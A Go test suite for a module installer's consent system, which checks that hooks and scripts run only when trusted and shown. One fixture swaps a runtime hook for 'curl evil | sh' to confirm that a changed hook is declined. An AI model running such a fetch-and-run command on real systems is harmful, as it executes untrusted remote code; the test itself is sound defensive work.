	DescribeTable("a receipt answered No, a refusal or an abort records no consent given by --trust",
		func(opts engine.Options, want types.GomegaMatcher) {
			kit("{pre-install: hooks/pre.sh}")
			writeTree(proj, map[string]string{"mods/kit2/lola.yml": "name: kit2\nhooks: {pre-install: hooks/pre.sh}\n", "mods/kit2/commands/kit2.md": "Kit2\n",
				"mods/kit2/hooks/pre.sh": script})
			Expect(os.Chmod(filepath.Join(proj, "mods", "kit2", "hooks", "pre.sh"), 0o755)).To(Succeed())
			pull("kit", "kit2")
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: opts})
			Expect(err).To(want)
			Expect(consented()).To(BeEmpty())
			Expect(trusts("kit")).To(BeFalse())
			Expect(ran()).To(BeNil())
			Expect(filepath.Join(proj, ".claude")).NotTo(BeADirectory())
		},
		Entry("No", engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Receipt: answer(false, nil)}, MatchError(engine.ErrDeclined)),
		Entry("a refusal for another kind", engine.Options{Trust: engine.TrustHooks, Unseen: true, Receipt: answer(true, nil)},
			MatchError("lola sync needs your trust for .lola/project.yml, which has not been trusted on this machine, and there is no terminal to ask on")),
		Entry("Ctrl+C", engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Receipt: answer(false, context.Canceled)}, MatchError(context.Canceled)),
		Entry("a terminal yes, then No at the receipt", engine.Options{Trust: engine.TrustEntries, Ask: askYes("kit", "kit2"),
			Receipt: answer(false, nil)}, MatchError(engine.ErrDeclined)),
		Entry("a terminal yes, then Ctrl+C at the receipt", engine.Options{Trust: engine.TrustEntries, Ask: askYes("kit", "kit2"),
			Receipt: answer(false, context.Canceled)}, MatchError(context.Canceled)),
		Entry("a terminal yes, then a refusal of another module's hook", engine.Options{Trust: engine.TrustEntries, Ask: askYes("kit"),
			Receipt: answer(true, nil)}, MatchError(HavePrefix("kit2 has a pre-install hook, and lola runs hooks only with your consent: "))),
	)

	It("an error showing the --trust record ends the sync before the receipt, recording nothing", func() {
		kit("{pre-install: hooks/pre.sh}")
		pull("kit")
		receipts := 0
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Show: func(engine.TrustReport) error { return context.Canceled },
			Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Receipt: func([]engine.Consent) (bool, error) { receipts++; return true, nil }}})
		Expect(err).To(MatchError(context.Canceled))
		Expect(receipts).To(BeZero())
		Expect(consented()).To(BeEmpty())
		Expect(trusts("kit")).To(BeFalse())
		Expect(ran()).To(BeNil())
		Expect(filepath.Join(proj, ".claude")).NotTo(BeADirectory())
	})

	It("covered items reach the receipt once, grouped in canonical order, before anything is written", func() {
		kit("{pre-install: hooks/pre.sh}")
		pull("kit")
		var got []engine.Consent
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustAll, Unseen: true, Receipt: receipt(true, &got)}})
		Expect(err).NotTo(HaveOccurred())
		want := []engine.Consent{{Kind: "entries", Item: "targets", Change: engine.ConsentNew}, {Kind: "entries", Item: "kit", Change: engine.ConsentNew},
			{Kind: "hooks", Item: "kit pre-install", Change: engine.ConsentNew}}
		Expect(got).To(Equal(want))
		Expect(res.Trusted).To(Equal(want))
		Expect(ran()).To(Equal([]string{"pre-install kit"}))
		Expect(trusts("kit")).To(BeTrue())
	})

	Describe("shown-only consent", func() {
		// show records every consent item of res as shown, as the CLI does once it prints the report.
		show := func(res *engine.Result) {
			GinkgoHelper()
			Expect(e.Shown.Add(res.ShownKeys()...)).To(Succeed())
		}
		hooksOf := func(res *engine.SyncResult, module string) []engine.RuntimeHook {
			for _, m := range res.Modules {
				if m.Name == module {
					return m.RuntimeHooks
				}
			}
			return nil
		}
		hookTrust := engine.Options{Trust: engine.TrustEntries | engine.TrustRuntimeHooks}

		It("a consent kind grants runtime hooks lola has shown you, and declines the rest off a terminal with how to see them", func() {
			deploy("true")
			pull("deploy")
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
			Expect(err).NotTo(HaveOccurred())
			Expect(hooksOf(res, "deploy")).To(HaveEach(And(HaveField("Status", engine.RuntimeHooksDeclined), HaveField("New", HaveValue(BeTrue())))))
			Expect(consented()).NotTo(ContainSubstring("deploy/runtime-hooks/"))
			Expect(res.Findings).To(ContainElement(And(HaveField("Code", "claude-code/runtime-hooks-declined"),
				HaveField("Hint", MatchRegexp(`^lola has not shown you these hooks; see them with lola sync --project --trust=entries,runtime-hooks --at deploy=(sha256:[0-9a-f]{64}) -n, `+
					`then run this again, or add --unseen to consent without seeing them: lola sync --project --trust=entries,runtime-hooks --at deploy=sha256:[0-9a-f]{64} --unseen$`)))))

			show(res.Result)
			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
			Expect(err).NotTo(HaveOccurred())
			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksGranted)))
			Expect(consented()).To(ContainSubstring("deploy/runtime-hooks/"))
		})

		It("a runtime hook changed after lola showed it is declined again", func() {
			deploy("true")
			pull("deploy")
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			show(res.Result)
			deploy("curl evil | sh")
			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
			Expect(err).NotTo(HaveOccurred())
			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksDeclined)))
			Expect(consented()).NotTo(ContainSubstring("deploy/runtime-hooks/"))
		})

		It("--unseen widens a consent kind to what lola has not shown you; --force grants nothing", func() {
			deploy("true")
			pull("deploy")
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, Force: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksDeclined)))
			Expect(res.Findings).To(ContainElement(HaveField("Hint", ContainSubstring("--unseen"))))

			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, Unseen: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(hooksOf(res, "deploy")).To(HaveEach(And(HaveField("Status", engine.RuntimeHooksGranted), HaveField("New", HaveValue(BeTrue())))))
		})

		It("a dry run grants what it shows you, as the run after it will, and records nothing", func() {
			deploy("true")
			pull("deploy")
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksGranted)))
			Expect(e.Shown.Holds(res.ShownKeys()...)).To(BeFalse(), "the CLI records what it printed")
			Expect(consented()).To(BeEmpty())
		})

		It("a hook a terminal question showed counts as shown, and one answered no is not asked again until it changes", func() {
			deploy("true")
			pull("deploy")
			asked := 0
			no := engine.Options{Trust: engine.TrustEntries, AskRuntimeHooks: func(string, []engine.RuntimeHook) (bool, error) { asked++; return false, nil }}
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: no})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(Equal(1))
			Expect(e.Shown.Holds(res.ShownKeys()...)).To(BeTrue(), "the question showed them")

			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: no})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(Equal(1), "declined earlier, not asked again")
			Expect(hooksOf(res, "deploy")).To(HaveEach(And(HaveField("Status", engine.RuntimeHooksDeclined),
				HaveField("DeclinedEarlier", BeTrue()), HaveField("New", HaveValue(BeFalse())))))
			Expect(res.Findings).To(ContainElement(And(HaveField("Code", "claude-code/runtime-hooks-declined"),
				HaveField("Hint", HaveSuffix("consent to them: lola sync --project --trust=entries,runtime-hooks")))))

			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
			Expect(err).NotTo(HaveOccurred())
			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksGranted)), "the hint works as printed")
			deploy("echo changed")
			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: no})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(Equal(2), "its content changed")
		})

		It("a batch's apply pass grants, by --trust, the hooks its collect pass showed in a question", func() {
			deploy("true")
			pull("deploy")
			asked := 0
			yes := func(string, []engine.RuntimeHook) (bool, error) { asked++; return true, nil }
			batch := &engine.TrustBatch{}
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, Batch: batch, AskRuntimeHooks: yes}})
			Expect(err).To(MatchError(engine.ErrBatched))
			Expect(asked).To(Equal(1), "unseen, so asked on the terminal, which shows them")
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, Expect: batch}})
			Expect(err).NotTo(HaveOccurred())
			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksGranted)))
			Expect(consented()).To(ContainSubstring("deploy/runtime-hooks/"))
		})

		It("a No in a batch's collect pass is not asked again, as a No at a question", func() {
			deploy("true")
			pull("deploy")
			asked := 0
			no := func(string, []engine.RuntimeHook) (bool, error) { asked++; return false, nil }
			batch := &engine.TrustBatch{}
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Batch: batch, AskRuntimeHooks: no}})
			Expect(err).To(MatchError(engine.ErrBatched))
			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Expect: batch}})
			Expect(err).NotTo(HaveOccurred())
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, AskRuntimeHooks: no}})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(Equal(1))
			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("DeclinedEarlier", BeTrue())))
		})

		It("hooks declined where nothing asked are asked about on a later terminal run", func() {
			deploy("true")
			pull("deploy")
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
			Expect(err).NotTo(HaveOccurred())
			asked := 0
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries,
				AskRuntimeHooks: func(string, []engine.RuntimeHook) (bool, error) { asked++; return false, nil }}})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(Equal(1), "no one answered the off-terminal decline")
			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("DeclinedEarlier", BeFalse())))
		})

		It("a pre-install hook lola has not shown you is refused, recording nothing; the dry run it hints shows its body", func() {
			kit("{pre-install: hooks/pre.sh}")
			opts := engine.Options{Targets: []string{"claude-code"}, Trust: engine.TrustHooks}
			install := func(o engine.Options) (*engine.Result, error) {
				return e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "kit")}}, o)
			}
			_, err := install(opts)
			Expect(err).To(MatchError(MatchRegexp(`^kit has a pre-install hook lola had not shown you: pre-install: hooks/pre\.sh \(sha256 [0-9a-f]{64}\)$`)))
			Expect(errs.Hints(err)).To(ContainElements(
				HavePrefix("lola has not shown you this hook; see it with lola install --project "),
				HavePrefix("or add --unseen to consent without seeing it: lola install --project ")))
			Expect(p.Shown).NotTo(BeAnExistingFile(), "a path and a sha256 are not the hook")
			_, err = install(opts)
			Expect(err).To(HaveOccurred(), "refused again")
			Expect(ran()).To(BeNil())

			dry := opts
			dry.DryRun = true
			res, err := install(dry)
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Modules[0].Hooks).To(HaveEach(And(HaveField("Body", script), HaveField("New", HaveValue(BeTrue())))))
			show(res)
			_, err = install(opts)
			Expect(err).NotTo(HaveOccurred())
			Expect(ran()).To(Equal([]string{"pre-install kit"}))
		})

		It("a project's pre-install script lola has not shown you is refused, recording nothing; the dry run it hints shows its body", func() {
			kit("")
			pull("kit")
			writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\npre_install: ci/pre.sh\nmodules:\n" +
				"  - {name: kit, source: ./mods/kit}\n", "ci/pre.sh": script})
			Expect(os.Chmod(filepath.Join(proj, "ci", "pre.sh"), 0o755)).To(Succeed())
			trust := engine.Options{Trust: engine.TrustEntries | engine.TrustScripts}
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: trust})
			Expect(err).To(MatchError(MatchRegexp(`pre-install script ci/pre\.sh \(sha256 [0-9a-f]{64}\) of this project`)))
			Expect(errs.Hints(err)).To(ContainElements(
				MatchRegexp(`^lola has not shown you this script; see it with lola sync --project --trust=entries,scripts( --at kit=sha256:[0-9a-f]{64})? -n, then run this again$`),
				HavePrefix("or add --unseen to consent without seeing it: lola sync --project --trust=entries,scripts")))
			Expect(p.Shown).NotTo(BeAnExistingFile())
			Expect(ran()).To(BeNil())

			dry := trust
			dry.DryRun = true
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: dry})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Scripts).To(HaveEach(And(HaveField("Body", script), HaveField("New", HaveValue(BeTrue())))))
			show(res.Result)
			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: trust})
			Expect(err).NotTo(HaveOccurred())
			Expect(ran()).To(Equal([]string{"pre-install kit"}))
		})

		It("a sync with nothing to install lists the project's pre-install script in a dry run, so its hint shows it", func() {
			kit("")
			pull("kit")
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
			Expect(err).NotTo(HaveOccurred())
			writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\npre_install: ci/pre.sh\nmodules:\n" +
				"  - {name: kit, source: ./mods/kit}\n", "ci/pre.sh": script})
			Expect(os.Chmod(filepath.Join(proj, "ci", "pre.sh"), 0o755)).To(Succeed())
			trust := engine.Options{Trust: engine.TrustEntries | engine.TrustScripts}
			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: trust})
			Expect(err).To(MatchError(ContainSubstring("lola had not shown it to you")))
			dry := trust
			dry.DryRun = true
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: dry})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Scripts).To(ConsistOf(And(HaveField("Status", engine.HookLater), HaveField("Module", ""), HaveField("Body", script))))
			show(res.Result)
			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: trust})
			Expect(err).NotTo(HaveOccurred())
		})

		DescribeTable("a hook too large or not text is never shown: its body is withheld, and only --unseen consents to it",
			func(body, why string) {
				kit("{pre-install: hooks/pre.sh}")
				writeTree(proj, map[string]string{"mods/kit/hooks/pre.sh": body})
				opts := engine.Options{Targets: []string{"claude-code"}, Trust: engine.TrustHooks}
				install := func(o engine.Options) (*engine.Result, error) {
					return e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "kit")}}, o)
				}
				dry := opts
				dry.DryRun = true
				res, err := install(dry)
				Expect(err).NotTo(HaveOccurred())
				Expect(res.Modules[0].Hooks).To(HaveEach(And(HaveField("Body", ""), HaveField("Withheld", why),
					HaveField("Inspect()", HaveSuffix("/hooks/pre.sh")))))
				Expect(res.Trusted).To(BeEmpty(), "a dry run grants nothing it cannot show")
				show(res)
				_, err = install(opts)
				Expect(err).To(HaveOccurred())
				Expect(errs.Hints(err)).To(ContainElement(MatchRegexp(`^lola cannot show you this hook \(` + strings.ReplaceAll(why, "_", " ") +
					`\); inspect .*/hooks/pre\.sh, then consent to it unseen: lola install .* --unseen$`)))
				opts.Unseen = true
				_, err = install(opts)
				Expect(err).NotTo(HaveOccurred())
			},
			Entry("too large", "#!/bin/sh\n"+strings.Repeat("# filler\n", 8<<10), engine.BodyTooLarge),
			Entry("not text", "#!/bin/sh\nexit 0\n\x00", engine.BodyNotText),
		)

		It("a body keeps its bytes: a tab is a tab, and the sha256 is the file's", func() {
			kit("{pre-install: hooks/pre.sh}")
			writeTree(proj, map[string]string{"mods/kit/hooks/pre.sh": "#!/bin/sh\n\techo tab\n"})
			res, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "kit")}},
				engine.Options{Targets: []string{"claude-code"}, DryRun: true})
			Expect(err).NotTo(HaveOccurred())
			sum := sha256.Sum256([]byte("#!/bin/sh\n\techo tab\n"))
			Expect(res.Modules[0].Hooks).To(HaveEach(And(HaveField("Body", "#!/bin/sh\n\techo tab\n"), HaveField("SHA256", hex.EncodeToString(sum[:])))))
		})

		It("keys a runtime hook's shown record over its raw content: one shown does not cover another that displays the same", func() {
			deploy(`printf \u0001`)
			pull("deploy")
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			show(res.Result)
			first := hooksOf(res, "deploy")
			deploy(`printf \u0002`)
			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
			Expect(err).NotTo(HaveOccurred())
			second := hooksOf(res, "deploy")
			Expect(second[0].Command).To(Equal(first[0].Command), "both display as printf ?")
			Expect(second).To(HaveEach(HaveField("Status", engine.RuntimeHooksDeclined)), "the other bytes were never shown")
		})

		It("a corrupt shown record is refused with the hint that deleting it is safe", func() {
			deploy("true")
			pull("deploy")
			writeTree(filepath.Dir(p.Shown), map[string]string{"shown.json": "{"})
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
			Expect(err).To(MatchError(ContainSubstring(p.Shown)))
			Expect(errs.Hints(err)).To(ContainElement(ContainSubstring("rm " + p.Shown)))
		})
	})

	Describe("profile --update", func() {
		It("profile --update without a scope flag applies profiles trust only", func() {
			kit("")
			pull("kit")
			dir := filepath.Join(p.RemoteProfiles, "go")
			writeTree(dir, map[string]string{"profile.yml": "version: 1\nmodules: []\n",
				"source.json": `{"version":1,"source":"https://example.com/profiles.git","commit":"0000000000000000000000000000000000000000","digest":"sha256:00"}`}) // DevSkim: ignore DS173237 - fake commit ID fixture, not a key
			_, err := e.UpdateProfile(ctx, engine.ProfileUpdateRequest{Names: []string{"go"}, CannotAsk: true, Trust: engine.TrustAll,
				Rerun: []string{engine.TrustAll.Arg()}})
			Expect(err).To(MatchError(ContainSubstring("project " + proj + " has changes you have not trusted (kit and project.yml's targets), which its sync asks about, and no flag named it")))
			Expect(errs.Hints(err)).To(Equal([]string{
				"name it, and trust them: lola profile --project remote:go --update --trust=entries,profiles,scripts,hooks,runtime-hooks",
				"or with user scope too: lola profile --scope both remote:go --update --trust=entries,profiles,scripts,hooks,runtime-hooks"}))
		})
	})

	DescribeTable("a narrowed profile --update hint drops --trust in any form",
		func(flag string) {
			kit("")
			led := &ledger.Ledger{Version: ledger.Version, Modules: map[string]*ledger.Entry{}}
			Expect(led.Save(filepath.Join(proj, ".lola", "lock.json"))).To(Succeed())
			writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\nmodules: []\n"})
			Expect(os.WriteFile(filepath.Join(proj, ".lola", "lock.json"), []byte("{not json"), 0o644)).To(Succeed())
			dir := filepath.Join(p.RemoteProfiles, "go")
			writeTree(dir, map[string]string{"profile.yml": "version: 1\nmodules: []\n",
				"source.json": `{"version":1,"source":"https://example.com/profiles.git","commit":"0000000000000000000000000000000000000000","digest":"sha256:00"}`}) // DevSkim: ignore DS173237 - fake commit ID fixture, not a key
			_, err := e.UpdateProfile(ctx, engine.ProfileUpdateRequest{Names: []string{"go"}, Consent: func([]engine.RemoteProfile) (bool, error) { return true, nil },
				Rerun: []string{flag, "--plain"}, Flags: []string{"-y"}})
			Expect(err).To(HaveOccurred())
			Expect(errs.Hints(err)).To(ContainElement("or update it at user scope only: lola profile --user remote:go --update --plain"))
		},
		Entry("--trust", "--trust"),
		Entry("--trust=hooks", "--trust=hooks"),
		Entry("--trust=entries,profiles", "--trust=entries,profiles"),
	)
})

var _ = Describe("typed trust after the receipt", func() {
	var (
		tmp, proj string
		p         paths.Paths
		e         *engine.Engine
		sc        engine.Scope
		ctx       = context.Background()
	)
	BeforeEach(func() {
		var err error
		tmp, err = filepath.EvalSymlinks(testenv.Isolate())
		Expect(err).NotTo(HaveOccurred())
		p, err = paths.Resolve(os.Getenv)
		Expect(err).NotTo(HaveOccurred())
		e = engine.New(p, targets.Builtin())
		proj = filepath.Join(tmp, "proj")
		e.Getwd = func() (string, error) { return proj, nil }
		sc = engine.Scope{Kind: target.Project, ProjectDir: proj}
		writeTree(proj, map[string]string{"mods/kit/lola.yml": "name: kit\nhooks: {pre-install: hooks/pre.sh}\n", "mods/kit/commands/kit.md": "Kit\n",
			"mods/kit/hooks/pre.sh": "#!/bin/sh\nexit 3\n", ".lola/project.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: ./mods/kit}\n"})
		Expect(os.Chmod(filepath.Join(proj, "mods", "kit", "hooks", "pre.sh"), 0o755)).To(Succeed())
	})

	It("a failure after the grants were written carries them as trusted", func() {
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true}})
		Expect(err).To(MatchError(ContainSubstring("pre-install hook hooks/pre.sh of kit failed")))
		te, ok := errors.AsType[*engine.TrustedError](err)
		Expect(ok).To(BeTrue())
		Expect(te.JSONFields()).To(HaveKeyWithValue("trusted", []engine.Consent{{Kind: "hooks", Item: "kit pre-install", Change: engine.ConsentNew}}),
			"the grants written, which a refusal or an abort never has")
		Expect(p.Consent).To(BeAnExistingFile())
	})

	It("a batch collects every run's covered items and grants, which each run records only when applied", func() {
		batch := &engine.TrustBatch{}
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Batch: batch}})
		Expect(err).To(MatchError(engine.ErrBatched))
		Expect(batch.Items).To(Equal([]engine.Consent{{Kind: "entries", Item: "targets", Change: engine.ConsentNew},
			{Kind: "entries", Item: "kit", Change: engine.ConsentNew}, {Kind: "hooks", Item: "kit pre-install", Change: engine.ConsentNew}}))
		Expect(p.Consent).NotTo(BeAnExistingFile())
		Expect(filepath.Join(proj, ".claude")).NotTo(BeADirectory())
		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Expect: batch}})
		Expect(err).To(MatchError(ContainSubstring("pre-install hook hooks/pre.sh of kit failed")), "the run applied after the receipt")
		Expect(p.Consent).To(BeAnExistingFile(), "it recorded its grants, which the batch held, just before its apply")
	})
})

var _ = Describe("a batch applied after its one receipt", func() {
	var (
		tmp, proj string
		p         paths.Paths
		e         *engine.Engine
		sc, user  engine.Scope
		ctx       = context.Background()
	)
	hooked := func(dir, body string) {
		writeTree(dir, map[string]string{"lola.yml": "name: kit\nhooks: {pre-install: pre.sh}\n", "commands/kit.md": "Kit\n", "pre.sh": "#!/bin/sh\n" + body + "\n"})
		Expect(os.Chmod(filepath.Join(dir, "pre.sh"), 0o755)).To(Succeed())
	}
	BeforeEach(func() {
		var err error
		tmp, err = filepath.EvalSymlinks(testenv.Isolate())
		Expect(err).NotTo(HaveOccurred())
		p, err = paths.Resolve(os.Getenv)
		Expect(err).NotTo(HaveOccurred())
		e = engine.New(p, targets.Builtin())
		proj = filepath.Join(tmp, "proj")
		e.Getwd = func() (string, error) { return proj, nil }
		sc, user = engine.Scope{Kind: target.Project, ProjectDir: proj}, engine.Scope{Kind: target.User}
		hooked(filepath.Join(proj, "mods", "kit"), "true")
		writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: ./mods/kit}\n"})
	})
	run := func(s engine.Scope, opts engine.Options) error {
		opts.Trust = engine.TrustEntries | engine.TrustHooks
		opts.Unseen = true
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: s, Options: opts})
		return err
	}

	It("refuses a run whose grants moved after the receipt, by key and digest, writing nothing", func() {
		batch := &engine.TrustBatch{}
		Expect(run(sc, engine.Options{Batch: batch})).To(MatchError(engine.ErrBatched))
		hooked(filepath.Join(proj, "mods", "kit"), "true # changed after the receipt")
		err := run(sc, engine.Options{Expect: batch})
		Expect(err).To(MatchError("what --trust covers changed after you answered its receipt; nothing more was written"))
		Expect(p.Consent).NotTo(BeAnExistingFile())
		Expect(filepath.Join(proj, ".claude")).NotTo(BeADirectory())
	})

	It("applies one module at two versions in two scopes, each recording its own digest before its own apply", func() {
		work := filepath.Join(tmp, "kit-work")
		hooked(work, "true # v1")
		gitIn(work, "init", "-q", "-b", "main")
		gitIn(work, "add", "-A")
		gitIn(work, "commit", "-q", "-m", "v1")
		gitIn(work, "tag", "v1")
		hooked(work, "true # v2")
		gitIn(work, "commit", "-q", "-am", "v2")
		gitIn(work, "tag", "v2")
		gitIn(tmp, "clone", "-q", "--bare", work, filepath.Join(tmp, "srv", "kit.git"))
		url := testenv.ServeGit(filepath.Join(tmp, "srv")) + "/kit.git"
		writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: " + url + ", ref: v1}\n"})
		writeTree(p.UserProfiles, map[string]string{"default.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: " +
			url + ", ref: v2}\n"})
		batch := &engine.TrustBatch{}
		Expect(run(sc, engine.Options{Batch: batch})).To(MatchError(engine.ErrBatched))
		Expect(run(user, engine.Options{Batch: batch})).To(MatchError(engine.ErrBatched))
		Expect(run(sc, engine.Options{Expect: batch})).To(Succeed())
		Expect(run(user, engine.Options{Expect: batch})).To(Succeed())
		Expect(filepath.Join(proj, ".claude", "commands", "kit.md")).To(BeAnExistingFile())
		Expect(filepath.Join(p.Home, ".claude", "commands", "kit.md")).To(BeAnExistingFile())
	})
})
